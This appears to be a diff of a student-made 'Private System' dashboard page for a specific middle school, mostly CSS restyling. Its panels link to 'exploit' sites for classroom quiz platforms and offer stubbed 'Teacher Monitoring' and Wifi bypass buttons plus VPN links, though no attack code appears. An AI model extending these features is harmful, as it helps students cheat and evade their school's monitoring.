@@ -11,11 +11,11 @@
       font-family: 'Segoe UI', sans-serif;
     }
 
+    /* THE ONE BIG BACKGROUND FOR THE ENTIRE BODY */
     body {
         margin: 0;
         padding: 0;
-        /* NEW: Example of one big background. Adjust as desired. */
-        background: linear-gradient(135deg, var(--main-bg, #0d0d0d) 0%, #1a1a1a 100%) !important;
+        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
         background-attachment: fixed !important; /* Keep background fixed when scrolling */
         color: var(--main-text-color, #e0e0e0);
         transition: background-color 0.4s, color 0.4s;
@@ -25,32 +25,38 @@
     }
 
     body.light-theme {
-        --main-bg: #f0f0f0;
+        --main-bg-start: #f0f0f0;
+        --main-bg-end: #dddddd;
         --main-text-color: #333;
-        --box-bg-light: #fcfcfc;
-        --item-bg-alt-light: #eee;
-        --panel-bg-light: #fcfcfc;
-        --heading-color-light: #994d00;
-        --box-shadow-accent-light: rgba(255, 145, 77, 0.6);
-        --accent-color: var(--accent-color-light, #994d00);
-        /* NEW: Light theme also uses its specific colors */
-        background: linear-gradient(135deg, var(--main-bg, #f0f0f0) 0%, #dddddd 100%) !important;
+        --box-bg-dark: #fcfcfc; /* Now refers to light theme box bg */
+        --item-bg-alt-dark: #eee; /* Now refers to light theme alt item bg */
+        --panel-bg-dark: #fcfcfc; /* Now refers to light theme panel bg */
+        --heading-color-dark: #994d00; /* Now refers to light theme heading color */
+        --accent-color: var(--accent-color-light, #994d00); /* Lighter accent for light theme context */
+        /* Redefine the gradient for light theme body background */
+        background: linear-gradient(135deg, var(--main-bg-start, #f0f0f0) 0%, var(--main-bg-end, #dddddd) 100%) !important;
     }
 
     :root {
         --accent-color: #ff914d;
         --accent-color-light: #994d00;
-        --main-bg: #0d0d0d;
+        --main-bg-start: #0d0d0d;
+        --main-bg-end: #1a1a1a;
         --main-text-color: #e0e0e0;
-        --box-bg-dark: #2a2a2a;
-        --item-bg-alt-dark: #3b3b3b;
-        --panel-bg-dark: #2a2a2a;
-        --heading-color-dark: #ffbf80;
+        --box-bg-dark: #2a2a2a; /* Dark theme box background */
+        --item-bg-alt-dark: #3b3b3b; /* Dark theme alternate item background */
+        --panel-bg-dark: #2a2a2a; /* Dark theme panel background */
+        --heading-color-dark: #ffbf80; /* Dark theme heading color */
+
         --header-start-color: #ff914d;
         --header-end-color: #ffcc80;
+
+        /* For unified button hover/shadow effects */
+        --accent-color-light-hover: #ffb67a; /* Example lighter shade for hover */
+        --accent-color-hover-shadow: rgba(255, 145, 77, 0.8); /* Stronger shadow */
     }
 
-    /* Loading Screen Styles (retained) */
+    /* Loading Screen Styles (Retained animations from previous version) */
     .loading-screen {
         position: fixed;
         top: 0;
@@ -113,9 +119,9 @@
         visibility: hidden;
     }
 
-    /* Login System Styles */
+    /* Login System Styles (adjusted for square-ish look, etc.) */
     body.login-body {
-        background: linear-gradient(135deg, var(--main-bg, #0d0d0d) 0%, #1a1a1a 100%) !important;
+        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
         background-attachment: fixed !important;
         color: #fff;
         display: flex;
@@ -126,10 +132,10 @@
 
     .login-box {
         background: var(--box-bg-dark, #1a1a1a);
-        border-radius: 15px;
+        border-radius: 15px; /* Square-ish with rounded corners */
         border: 2px solid var(--accent-color);
         box-shadow: 0 0 25px rgba(255, 145, 77, 0.5);
-        width: 400px;
+        width: 400px; /* Adjust to ensure overall square aspect with padding */
         padding: 40px;
         text-align: center;
         position: relative;
@@ -176,12 +182,14 @@
         outline: none;
     }
     
+    /* NEW: Improved show password toggle */
     .show-password-container {
         display: flex;
         align-items: center;
         justify-content: flex-start;
         margin-bottom: 20px;
         cursor: pointer;
+        user-select: none; /* Prevent text selection */
     }
     .show-password-container span {
         font-size: 0.95em;
@@ -190,20 +198,21 @@
     }
     .show-password-container input[type="checkbox"] {
         appearance: none;
-        width: 40px;
-        height: 20px;
+        width: 40px; /* Switch width */
+        height: 20px; /* Switch height */
         background-color: #555;
-        border-radius: 10px;
+        border-radius: 10px; /* Pill shape */
         position: relative;
         cursor: pointer;
         transition: background-color 0.3s;
+        flex-shrink: 0; /* Don't let it shrink */
     }
     .show-password-container input[type="checkbox"]::before {
         content: '';
         position: absolute;
         left: 2px;
         top: 2px;
-        width: 16px;
+        width: 16px; /* Circle diameter */
         height: 16px;
         background-color: white;
         border-radius: 50%;
@@ -213,15 +222,18 @@
         background-color: var(--accent-color);
     }
     .show-password-container input[type="checkbox"]:checked::before {
-        transform: translateX(20px);
+        transform: translateX(20px); /* Move circle to right side */
     }
 
-    /* NEW: Unified Orange Button Styling - No individual backgrounds */
+    /* NEW: Unified Orange Button Styling - All buttons transparent backgrounds */
     .login-box button,
-    .action-button,
-    .quickbar-container button,
-    .button-grid-container .box button,
-    .button-grid-container .box a {
+    .action-button, /* Applied to normal action buttons inside panels too */
+    .quickbar-container button, /* Quickbar buttons */
+    .button-grid-container .box button, /* Panel triggering buttons */
+    .button-grid-container .box a, /* Panel triggering links */
+    .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, /* Buttons in link/list sections */
+    .reminder-item button /* Buttons in reminder items */
+    {
         background: transparent !important; /* Force transparent background */
         border: 2px solid var(--accent-color) !important; /* Visible accent border */
         color: var(--accent-color) !important; /* Accent text color */
@@ -230,8 +242,13 @@
         font-weight: bold;
         cursor: pointer;
         transition: all 0.3s ease;
-        text-shadow: none; /* No text shadow to prevent conflicts */
+        text-shadow: none; /* No text shadow by default to avoid clash */
         box-shadow: 0 0 10px rgba(255, 145, 77, 0.2); /* Subtle accent glow */
+        text-decoration: none; /* For link buttons */
+        display: inline-flex; /* For icons */
+        align-items: center; /* For icons */
+        justify-content: center; /* For icons */
+        gap: 8px; /* For icons */
     }
 
     /* Exception: Panic Button is Red */
@@ -244,7 +261,7 @@
     #panicBtn:hover {
         background-color: rgba(255, 76, 76, 0.2) !important; /* Faint red background on hover */
         box-shadow: 0 0 15px rgba(255, 76, 76, 0.6) !important;
-        color: white !important; /* Make text white for contrast */
+        color: white !important; /* Make text white for contrast on hover */
     }
 
     /* Hover effect for all general buttons */
@@ -252,20 +269,25 @@
     .action-button:hover,
     .quickbar-container button:hover,
     .button-grid-container .box button:hover,
-    .button-grid-container .box a:hover {
+    .button-grid-container .box a:hover,
+    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover,
+    .reminder-item button:hover {
         background-color: rgba(255, 145, 77, 0.1) !important; /* Faint accent background on hover */
         transform: translateY(-3px) scale(1.05); /* More animated */
         box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.6)) !important; /* Enhanced glow */
         color: white !important; /* Text to white for highlight */
     }
 
+    /* Active / Clicked state */
     .login-box button:active,
     .action-button:active,
     .quickbar-container button:active,
     .button-grid-container .box button:active,
-    .button-grid-container .box a:active {
+    .button-grid-container .box a:active,
+    .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active,
+    .reminder-item button:active {
         transform: translateY(1px) scale(0.95);
-        box-shadow: none !important;
+        box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2) !important; /* Inset shadow to simulate press */
     }
 
 
@@ -316,7 +338,7 @@
         gap: 10px;
         justify-content: center;
         padding: 10px 20px;
-        background: var(--box-bg-dark);
+        background: var(--box-bg-dark); /* Now the "big background" for quickbar buttons */
         border-radius: 0 0 15px 15px;
         box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         margin-bottom: 25px;
@@ -324,27 +346,18 @@
     }
 
     body.dashboard-body.light-theme .quickbar-container {
-        background: #fdfdfd;
+        background: var(--box-bg-dark); /* Light theme equivalent background */
         box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     }
     
     .quickbar-container button {
       padding: 10px 18px;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: all 0.3s ease;
       font-size: 0.9em;
       min-width: 100px;
       white-space: nowrap;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
     }
 
-    /* Grid for other main buttons */
+    /* NEW: Grid for panel-triggering buttons (each in a box) */
     .button-grid-container {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
@@ -365,6 +378,7 @@
         padding: 14px;
         font-size: 1em;
      }
+
 
     .main-row {
         display: flex;
@@ -392,7 +406,7 @@
     }
 
     body.dashboard-body.light-theme .box {
-        background-color: var(--box-bg-light);
+        background-color: var(--box-bg-dark); /* Refers to light theme box bg */
         color: var(--main-text-color);
         box-shadow: 0 0 18px var(--box-shadow-accent-light);
     }
@@ -410,7 +424,7 @@
     }
 
     body.dashboard-body.light-theme .box h2 {
-        color: var(--heading-color-light);
+        color: var(--heading-color-dark); /* Refers to light theme heading color */
         border-bottom-color: rgba(153, 77, 0, 0.4);
     }
 
@@ -424,6 +438,7 @@
         flex-direction: column;
         gap: 10px;
         max-width: 300px;
+        pointer-events: none; /* Allow clicks to pass through */
     }
 
     .dashboard-notification {
@@ -438,6 +453,7 @@
         animation: fadeInNotification 0.3s forwards;
         position: relative; /* For the close button */
         word-wrap: break-word; /* Ensure text wraps */
+        pointer-events: auto; /* Re-enable clicks for the notification itself (e.g. for close button) */
     }
 
     .dashboard-notification.fade-out {
@@ -470,6 +486,7 @@
         cursor: pointer;
         padding: 0;
         transition: color 0.2s;
+        pointer-events: auto; /* Ensure close button is clickable */
     }
     .notification-close-btn:hover {
         color: white;
@@ -483,7 +500,7 @@
 
     /* Activity Log Modal */
     .log-modal-overlay {
-        display: none;
+        display: none; /* Hidden by default */
         position: fixed;
         top: 0;
         left: 0;
@@ -526,6 +543,7 @@
         padding: 15px;
         border-radius: 8px;
         margin-bottom: 20px;
+        color: var(--main-text-color);
     }
     .log-modal-body .log-entry {
         border-bottom: 1px dotted #555;
@@ -538,6 +556,12 @@
         font-size: 0.8em;
         color: #999;
         margin-right: 10px;
+        flex-shrink: 0; /* Don't allow timestamp to wrap */
+    }
+    .log-modal-body .log-entry {
+        display: flex; /* Make timestamp and message align */
+        align-items: flex-start;
+        word-break: break-word; /* Ensure messages wrap */
     }
     .log-modal-close-btn {
         position: absolute;
@@ -556,7 +580,7 @@
     }
 
 
-    /* General UI components (adjusted or kept) */
+    /* General UI components */
     .calendar { display: grid; grid-template-columns: repeat(7, 1fr); gap: 6px; margin-top: 15px; text-align: center; font-size: 13px; }
     .calendar div { padding: 7px; background: #3f3f3f; border-radius: 5px; transition: background 0.2s ease, transform 0.1s ease; }
     .calendar div:hover:not(.today) { transform: translateY(-2px); background: #5a5a5a; }
@@ -566,7 +590,7 @@
     .info-panel h2 { color: var(--accent-color); margin-bottom: 20px; font-size: 22px; border-bottom: 2px solid rgba(255, 145, 77, 0.6); padding-bottom: 10px; display: flex; align-items: center; gap: 10px; }
     @keyframes fadeInPanel { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-    /* WiFi Color Coding (retained) */
+    /* WiFi Color Coding */
     .wifi-high { color: #4CAF50 !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(76, 175, 80, 0.7); }
     .wifi-medium { color: #ffeb3b !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(255, 235, 59, 0.7); }
     .wifi-low { color: #f44336 !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(244, 67, 54, 0.7); }
@@ -593,12 +617,11 @@
       box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.6)) !important;
     }
 
-
     .ipad-options { display: flex; gap: 12px; margin-top: 18px; }
     .ipad-options button { flex: 1; }
     .ipad-content, .bypass-content { display: none; background: #3c251d; padding: 20px; border-radius: 10px; margin-top: 18px; color: #ffccb3; }
 
-    /* Reminders Specific Styling (retained) */
+    /* Reminders Specific Styling */
     .reminder-form { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; align-items: flex-end; }
     .reminder-form input { padding: 10px; border-radius: 8px; border: 1px solid #444; background-color: #3b3b3b; color: #e0e0e0; font-size: 1em; }
     .reminder-form button { /* Inherits global button style */ }
@@ -610,14 +633,13 @@
     .reminder-item button { color: var(--accent-color) !important; } /* ensures delete/complete button text is accent-color */
     .reminder-item button:hover { background-color: rgba(255, 145, 77, 0.1) !important;}
 
-
-    /* Stats Panel Styling (retained) */
+    /* Stats Panel Styling */
     .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
     .stats-item { background: #3c251d; padding: 15px; border-radius: 8px; border-left: 3px solid var(--accent-color); }
     .stats-label { font-weight: bold; color: var(--heading-color-dark); margin-bottom: 5px; }
     .stats-value { font-family: 'Courier New', monospace; font-size: 1.1em; word-break: break-all; }
     
-    /* Media Player aspect ratio (retained) */
+    /* Media Player aspect ratio */
     #youtubePlayer iframe {
         display: block; /* Remove extra space below iframe */
     }
@@ -634,7 +656,7 @@
 
 
     /* Specific button icons - no color changes here */
-    #calendarTitle::before { content: '🗓️'; }
+    #calendarTitle::before { content: '🗓️'; } /* FIXED: Ensure only one calendar emoji */
     #updatesNotificationsTitle::before { content: '🔔'; }
     #sessionTime::before { content: '⏳'; }
     #realTimeClock::before { content: '🕒'; }
@@ -668,6 +690,7 @@
     .button-grid-container button[onclick*='gamingPanel']::before { content: '🎮'; }
     .button-grid-container button[onclick*='musicPanel']::before { content: '🎧'; }
     .button-grid-container button[onclick*='keyboardPanel']::before { content: '⌨️'; }
+    /* RE-ADDED FEATURES' ICONS */
     .button-grid-container button[onclick*='reminderPanel']::before { content: '⏰'; }
     .button-grid-container button[onclick*='statsPanel']::before { content: '📈'; }
     .button-grid-container button[onclick*='mediaPanel']::before { content: '📺'; }
@@ -699,7 +722,7 @@
 </head>
 <body class="login-body" id="bodyElement">
 
-    <!-- Loading Screen (retained) -->
+    <!-- Loading Screen (with rotating cube animation) -->
     <div id="loadingScreen" class="loading-screen">
       <div class="loading-cube">
         <div class="cube-face front"></div><div class="cube-face back"></div>
@@ -709,7 +732,7 @@
       <span id="loadingText" class="loading-text">Initializing System...</span>
     </div>
 
-    <!-- Login System -->
+    <!-- Login System (redesigned) -->
     <div class="login-box" id="loginBox" style="display: none;">
         <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
         <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
@@ -726,10 +749,10 @@
         <div class="error-message" id="errorMsg"></div>
         <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>
         
-        <!-- Re-added popup element for webhook logging - kept hidden. -->
+        <!-- Placeholder popup element for webhook consistency (remains hidden in UI) -->
         <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true" style="display:none;">
             <p>Too many failed attempts.</p>
-            <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
+            <input type="password" id="resetField" placeholder="Enter Reset Code" autocomplete="off" />
             <button id="resetBtn">Reset Counter</button>
         </div>
     </div>
@@ -775,6 +798,7 @@
                 <div class="calendar" id="calendar"></div>
             </div>
 
+             <!-- Updates & Notifications box (kept) -->
              <div class="box" id="updatesNotifications">
                 <h2 id="updatesNotificationsTitle">🔔 Updates & Notifications</h2>
                 <div class="update-entry">Welcome to Private System v2.0! Enjoy the new features and cleaner layout.</div>
@@ -782,13 +806,13 @@
                 <div class="update-entry">Proxied Media Player for YouTube!</div>
                 <div class="update-entry">Refreshed Login Screen with cube animations!</div>
                 <div class="update-entry">New top-right FADING Alert System!</div>
-                <div class="update-entry">All buttons now inherit unified background theme!</div>
+                <div class="update-entry">All buttons now inherit unified transparent background with orange border!</div>
                 <div class="update-entry">All dashboard panels now in individual boxes!</div>
                 <div class="update-entry">New 'Activity Log' button to view full history!</div>
             </div>
         </div>
       
-        <!-- Button Grid Layout for Panel-Triggering Buttons -->
+        <!-- NEW: Button Grid Layout for Panel-Triggering Buttons -->
         <div class="button-grid-container" id="panelButtonGrid">
           <div class="box"><button onclick="dashboard.togglePanel('wifiPanel')">📶 School WiFi Info</button></div>
           <div class="box"><button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button></div>
@@ -1016,89 +1040,150 @@
                     <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
                     <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
                     <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
-                    <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
+                    <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" class="action-button">Office 365</a>
                 </div>
             </div>
 
             <div id="phoneDirectoryPanel" class="info-panel">
                 <h2 id="phoneDirectoryPanelTitle">☎️ School Phone Directory Information</h2>
-                <div class="coming-soon">Update Coming Soon!</div>
+                <div class="coming-soon">
+                    Update Coming Soon!
+                </div>
             </div>
 
             <div id="cameraPanel" class="info-panel">
                 <h2 id="cameraPanelTitle">📹 School Camera Information</h2>
-                <div class="coming-soon">Update Coming Soon</div>
+                <div class="coming-soon">
+                    Update Coming Soon
+                </div>
             </div>
 
             <div id="schoolInfoPanel" class="info-panel">
                 <h2 id="schoolInfoPanelTitle">🏢 School Information</h2>
                 <div class="school-info-grid">
-                    <div class="school-info-item"><div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div></div>
-                    <div class="school-info-item"><div class="school-info-label">School Address:</div><div>215 Oberlin Road Middletown, PA 17057</div></div>
-                    <div class="school-info-item"><div class="school-info-label">School Phone:</div><div>717-930-0739</div></div>
-                    <div class="school-info-item"><div class="school-info-label">School Fax:</div><div>717-944-0591</div></div>
-                    <div class="school-info-item"><div class="school-info-label">School Principal:</div><div>Dr. Shannon L. Wevodau</div></div>
-                    <div class="school-info-item"><div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div></div>
-                    <div class="school-info-item"><div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div></div>
-                    <div class="school-info-item"><div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div></div>
-                    <div class="school-info-item"><div class="school-info-label">Assistant Principal's Phone:</div><div>717-930-0739</div></div>
-                    <div class="school-info-item"><div class="school-info-label">Assistant Principal's Email:</div><div>mdefilippo@raiderweb.org</div></div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">School Name:</div>
+                        <div>Middletown Area Middle School</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">School Address:</div>
+                        <div>215 Oberlin Road Middletown, PA 17057</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">School Phone:</div>
+                        <div>717-930-0739</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">School Fax:</div>
+                        <div>717-944-0591</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">School Principal:</div>
+                        <div>Dr. Shannon L. Wevodau</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">Principal's Phone:</div>
+                        <div>717-930-0739</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">Principal's Email:</div>
+                        <div>swevodau@raiderweb.org</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">Assistant Principal:</div>
+                        <div>Mr. Michael DeFilippo</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">Assistant Principal's Phone:</div>
+                        <div>717-930-0739</div>
+                    </div>
+                    <div class="school-info-item">
+                        <div class="school-info-label">Assistant Principal's Email:</div>
+                        <div>mdefilippo@raiderweb.org</div>
+                    </div>
                 </div>
             </div>
 
+            <!-- Exploit Panel -->
             <div id="exploitPanel" class="info-panel">
                 <h2 id="exploitPanelTitle">💣 Exploiting Tools</h2>
                 <div class="exploit-buttons">
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
-                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Blooket Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Kahoot Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Gimkit Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quizlet Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quizzes Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Quills Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Edpuzzle Exploit</a>
+                    <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" class="action-button red">Nearpod Exploit</a>
                 </div>
             </div>
 
+            <!-- Bypass Panel -->
             <div id="bypassPanel" class="info-panel">
                 <h2 id="bypassPanelTitle">🔑 Bypassing Tools</h2>
                 <div class="bypass-buttons">
-                    <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
-                    <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
-                    <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
-                    <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
-                    <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
-                    <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
+                    <button class="action-button red" onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
                 </div>
 
-                <div id="bathroomBypass" class="bypass-content"><p>COMING SOON</p></div>
-                <div id="wifiBypass" class="bypass-content"><p>Go to School Wifi Information</p></div>
-                <div id="monitoringBypass" class="bypass-content"><p>COMING SOON</p></div>
-                <div id="coming1Bypass" class="bypass-content"><p>COMING SOON</p></div>
-                <div id="coming2Bypass" class="bypass-content"><p>COMING SOON</p></div>
-                <div id="coming3Bypass" class="bypass-content"><p>COMING SOON</p></div>
+                <div id="bathroomBypass" class="bypass-content">
+                    <p>COMING SOON</p>
+                </div>
+
+                <div id="wifiBypass" class="bypass-content">
+                    <p>Go to School Wifi Information</p>
+                </div>
+
+                <div id="monitoringBypass" class="bypass-content">
+                    <p>COMING SOON</p>
+                </div>
+
+                <div id="coming1Bypass" class="bypass-content">
+                    <p>COMING SOON</p>
+                </div>
+
+                <div id="coming2Bypass" class="bypass-content">
+                    <p>COMING SOON</p>
+                </div>
+
+                <div id="coming3Bypass" class="bypass-content">
+                    <p>COMING SOON</p>
+                </div>
             </div>
 
+            <!-- VPN Panel -->
             <div id="vpnPanel" class="info-panel">
                 <h2 id="vpnPanelTitle">🛡️ VPN Websites</h2>
                 <div class="links-list">
-                    <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
-                    <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
-                    <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
-                    <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
+                    <a href="https://example-vpn1.com" target="_blank" class="action-button">VPN Service 1</a>
+                    <a href="https://example-vpn2.com" target="_blank" class="action-button">VPN Service 2</a>
+                    <a href="https://example-vpn3.com" target="_blank" class="action-button">VPN Service 3</a>
+                    <a href="https://example-vpn4.com" target="_blank" class="action-button">VPN Service 4</a>
                 </div>
             </div>
 
+            <!-- Gaming Panel -->
             <div id="gamingPanel" class="info-panel">
                 <h2 id="gamingPanelTitle">🎮 Gaming Websites</h2>
-                <div class="coming-soon">COMING SOON</div>
+                <div class="coming-soon">
+                    COMING SOON
+                </div>
             </div>
 
+            <!-- Music Panel -->
             <div id="musicPanel" class="info-panel">
                 <h2 id="musicPanelTitle">🎧 Music Websites</h2>
-                <div class="coming-soon">COMING SOON</div>
+                <div class="coming-soon">
+                    COMING SOON
+                </div>
             </div>
 
+            <!-- Keyboard Panel -->
             <div id="keyboardPanel" class="info-panel">
                 <h2 id="keyboardPanelTitle">⌨️ Keyboard Tricks</h2>
                 <div class="info-text">
@@ -1153,122 +1238,14 @@ General Navigation and Text Editing:
 To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
                 </div>
             </div>
-
-            <!-- Settings Panel -->
-            <div id="settingsPanel" class="info-panel">
-                <h2 id="settingsPanelTitle">🛠️ Settings</h2>
-                <div class="settings-grid">
-                    <div class="setting-group">
-                        <h3>General</h3>
-                        <div class="setting-item">
-                            <label for="themeSelector">Theme:</label>
-                            <select id="themeSelector">
-                                <option value="dark">Dark</option>
-                                <option value="light">Light</option>
-                            </select>
-                        </div>
-                        <div class="setting-item">
-                            <label for="announcementScrollSpeed">Announcement Scroll Speed:</label>
-                            <input type="range" id="announcementScrollSpeed" min="5" max="30" value="20">
-                            <span id="announcementScrollSpeedValue">20s</span>
-                        </div>
-                    </div>
-
-                    <div class="setting-group">
-                        <h3>Dashboard Display</h3>
-                        <div class="setting-item">
-                            <label for="dashboardLayout">Layout:</label>
-                            <select id="dashboardLayout">
-                                <option value="default">Default</option>
-                                <option value="compact">Compact</option>
-                            </select>
-                        </div>
-                        <div class="setting-item">
-                            <label for="enableMotivationQuote">Motivation Quote:</label>
-                            <input type="checkbox" id="enableMotivationQuote" checked>
-                        </div>
-                        <div class="setting-item">
-                            <label for="calendarDisplay">Calendar View:</label>
-                            <select id="calendarDisplay">
-                                <option value="month">Month</option>
-                                <option value="week">Week</option>
-                            </select>
-                        </div>
-                    </div>
-
-                    <div class="setting-group">
-                        <h3>Reminders & Notifications</h3>
-                        <div class="setting-item">
-                            <label for="reminderSound">Reminder Sound:</label>
-                            <input type="checkbox" id="reminderSound" checked>
-                        </div>
-                        <div class="setting-item">
-                            <label for="desktopNotifications">Desktop Notifications:</label>
-                            <input type="checkbox" id="desktopNotifications">
-                        </div>
-                    </div>
-
-                    <div class="setting-group">
-                        <h3>Customization</h3>
-                        <div class="setting-item">
-                            <label for="accentColorPicker">Accent Color:</label>
-                            <div class="color-picker">
-                                <input type="color" id="accentColorPicker" value="#ff914d">
-                                <button class="action-button small" onclick="dashboard.resetColorSetting('accentColorPicker')">Reset</button>
-                            </div>
-                        </div>
-                        <div class="setting-item">
-                            <label for="mainBgColorPicker">Main Background Color:</label>
-                            <div class="color-picker">
-                                <input type="color" id="mainBgColorPicker" value="#1a1a1a">
-                                <button class="action-button small" onclick="dashboard.resetColorSetting('mainBgColorPicker')">Reset</button>
-                            </div>
-                        </div>
-                        <div class="setting-item">
-                            <label for="headerBgColorPicker">Header Background:</label>
-                            <div class="color-picker">
-                                <input type="color" id="headerBgColorPicker" value="#ff914d">
-                                <button class="action-button small" onclick="dashboard.resetColorSetting('headerBgColorPicker')">Reset</button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="setting-group">
-                        <h3>Advanced</h3>
-                        <div class="setting-item">
-                            <label for="enableLogging">Enable Analytics Logging:</label>
-                            <input type="checkbox" id="enableLogging" checked>
-                        </div>
-                        <div class="setting-item">
